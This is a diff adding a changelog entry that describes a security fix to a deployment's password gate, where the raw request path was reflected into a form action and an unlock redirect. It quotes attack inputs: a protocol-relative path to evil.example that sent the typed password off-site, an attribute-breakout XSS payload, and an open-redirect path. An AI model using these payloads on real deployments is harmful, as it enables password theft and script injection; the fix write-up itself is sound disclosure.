@@ -1,5 +1,24 @@
 # Changelog
 
+## 2026-10-13 — the password gate no longer reflects the visitor's path into its form or redirect, and the edge forward keeps `//` paths (1f5458f68f)
+
+`edge::password_page` interpolated the visitor's raw request path, unescaped, into `<form action="{path}">`.
+Confirmed live: a request for `//evil.example/steal` made the gate submit the deployment password a visitor types
+to evil.example (the attacker needs only the deployment's URL, not the password), and a path containing a double
+quote, which the request-line parser tolerates, broke out of the attribute (`/x"onfocusin="alert(document.domain)`
+landed an event handler on the form, fired by the password field's autofocus: a reflected XSS on the protected
+deployment's own origin). After a correct password the unlock redirect used the raw path as its `Location`, so
+`//evil.example/x?__shadw_pw=...` redirected protocol-relative. The form now has no `action` (an absent one submits
+to the current URL), the project name is HTML-escaped, and the redirect goes through `auth::same_origin_path`.
+Also fixed: my earlier forward-leg change (fe27627bd2) resolved the visitor's path with `Url::join`, which treats a
+`//host/..` path as a network-path reference, so a legitimate `//assets/x.js` request had every candidate refused;
+the forward leg and `spawn_revalidate` now set the target as the PATH and QUERY of the gateway URL
+(`with_request_target`), identical to the old form for every legitimate target and unable to move the authority.
+Witnessed on throwaway enforced nodes (`secfix-pgate.sh`, `secfix-edge-redirect2.sh` on a real two-node mesh):
+before, the form action, the injected attribute and the protocol-relative redirect all worked; after, none do and
+the legitimate unlock flow is unchanged. Operator note: a visitor requesting a protected deployment at a `//`-prefixed
+path that then submits the password lands on the site root instead of that path. Not rolled.
+
 ## 2026-10-13 — `/api/tv/hls` decodes raw deflate, and an empty body under a content-coding is an empty body
 
 Two regressions in the content-coding decoder added a few commits earlier, from the round-3
